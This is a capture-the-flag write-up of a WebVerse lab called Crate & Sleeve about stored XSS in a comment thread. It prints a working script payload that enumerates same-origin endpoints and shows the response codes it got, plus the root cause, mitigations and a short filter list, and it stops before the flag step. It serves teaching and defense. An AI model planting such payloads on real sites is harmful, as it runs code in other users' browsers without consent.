---
title: "Stored XSS – Internal Endpoint Enumeration Through Comment Injection | Crate & Sleeve"
date: 2026-05-18 04:10:00 +0530
categories: [A05 - Injection, Stored Cross-Site Scripting]
tags: [xss, stored-xss, endpoint-enumeration, javascript-injection, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/crate-and-sleeve.webp
  alt: Crate and Sleeve WebVerse challenge
---

# Lab Link

Lab: [Crate & Sleeve](https://dashboard.webverselabs-pro.com/challenges/inscription)

# Overview

The **Crate & Sleeve** challenge appears to demonstrate a **Stored Cross-Site Scripting (Stored XSS)** vulnerability within community comment functionality.

The application allowed users to submit content that was later rendered in the browser without proper sanitization.

Because JavaScript execution became possible, browser-side actions could be performed automatically against application endpoints.

Instead of immediately targeting cookie theft or account takeover, JavaScript was used for endpoint discovery and application mapping.

# Objective

Abuse comment functionality to execute JavaScript and enumerate internal application resources.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A05: Injection
    └── Cross-Site Scripting (XSS)
        └── Stored XSS
            └── Unsanitized User Input Rendered in Comments
```

# Reconnaissance

The challenge description highlighted:

```text
The comment thread is where regulars haggle over pressing variants and condition grades
```

Comment systems are common attack surfaces because they frequently render user-controlled content.

Testing indicated JavaScript execution was possible.

Payload used:

```html
<script>
const paths=[
'/admin.php',
'/moderator.php',
'/dashboard.php',
'/comments.php',
'/comment.php',
'/profile.php',
'/users.php',
'/flag',
'/flag.php',
'/flag.txt',
'/robots.txt'
];

document.body.innerHTML="<h2>Results</h2>";

paths.forEach(p=>{
  fetch(p)
  .then(r=>document.body.innerHTML+=
    `<div>${p} : ${r.status}</div>`)
  .catch(()=>{});
});
</script>
```

# Analysis

The script attempted to:

- Request multiple application endpoints
- Capture HTTP response codes
- Display discovered results inside the page

This effectively created a lightweight browser-side directory enumeration mechanism.

Application responses:

```text
/robots.txt : 200

/flag.php : 404

/moderator.php : 404

/flag.txt : 404

/admin.php : 404

/profile.php : 404

/dashboard.php : 404
```

Server information:

```text
Apache/2.4.67 (Debian)
```

The successful response from:

```text
/robots.txt
```

suggested further information disclosure opportunities.

# Proof of Exploitation

Confirmed capabilities:

```text
Comment Input
        ↓
Stored JavaScript
        ↓
Victim Browser Execution
        ↓
Internal Endpoint Enumeration
```

This verified successful JavaScript execution within the application context.

# Root Cause

The application likely rendered comments similar to:

```php
echo $_POST['comment'];
```

instead of safely encoding output:

```php
echo htmlspecialchars(
    $_POST['comment']
);
```

As a result:

```html
<script>
...
</script>
```

was interpreted as executable code rather than plain text.

# Impact

Stored XSS can lead to:

- Session theft
- Account takeover
- Administrative compromise
- CSRF abuse
- Internal endpoint discovery
- Credential theft
- Sensitive information disclosure

Stored XSS often becomes more severe than reflected XSS because payloads execute automatically for other users.

# Mitigation

## Encode output before rendering

Bad:

```php
echo $comment;
```

Secure:

```php
echo htmlspecialchars(
    $comment
);
```

## Apply Content Security Policy

Example:

```http
Content-Security-Policy:
default-src 'self'
```

## Validate and sanitize user input

Restrict:

```text
<script>
onerror=
onload=
javascript:
```

## Avoid rendering raw HTML

User content should generally be treated as text.

# Real-World Insight

Stored XSS commonly appears in:

- Comments
- Forums
- Chat systems
- Support tickets
- User profiles
- Review platforms

A common assumption is:

```text
Only trusted users can post here
```

Attackers routinely abuse trusted content areas because users and administrators often interact with them automatically.

# Remaining Step

The final exploitation path and flag retrieval step were not included in the captured notes and should be added once completed.